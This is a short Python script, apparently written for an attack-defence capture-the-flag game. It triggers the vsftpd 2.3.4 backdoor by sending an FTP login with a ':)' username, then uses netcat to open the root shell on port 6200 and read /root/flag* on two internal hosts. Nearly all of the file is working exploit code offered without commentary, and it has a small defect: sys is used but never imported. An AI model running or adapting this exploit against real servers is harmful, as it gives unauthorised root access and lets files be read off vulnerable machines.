from ftplib import FTP
from threading import Thread
import pexpect

def ftped(ip):
    try:
        ftp=FTP()
        ftp.connect(ip,21)
        ftp.login("root:)","123456")
        ftp.close()
        sys.exit(0)
    except:
        pass

def netcat(ip):
    a=pexpect.spawn("nc "+ip+" "+"6200")
    a.sendline("cat /root/flag*")
    a.sendline("exit")
    print("ip:"+ip+"\t"+"6200")
    print(a.read())
    a.close()
    
for b in range(1,3):
    ip="172.16."+str(b)+".18"
    main=Thread(target=ftped,args=(ip,))
    main.start()
    netcat(ip)


